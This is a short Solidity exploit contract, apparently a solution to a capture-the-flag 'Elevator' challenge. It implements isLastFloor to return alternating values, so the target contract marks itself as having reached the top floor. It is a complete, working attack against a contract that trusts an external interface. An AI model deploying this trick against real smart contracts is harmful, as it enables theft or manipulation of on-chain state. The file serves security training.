pragma solidity 0.7.3;

import "hardhat/console.sol";

interface IElevator {
  function goTo(uint) external;
}

contract Attacker {
  bool panqueque = true;
  IElevator challenge;

  constructor (address challengeAddress) {
    challenge = IElevator(challengeAddress);
  }

  function isLastFloor(uint unPiso) external returns (bool) {
    panqueque = !panqueque;
    console.log("Valor actual de isLastFloor: %s", panqueque);
    return panqueque;
  }

  function usarElevador() external {
    challenge.goTo(10);
  }
}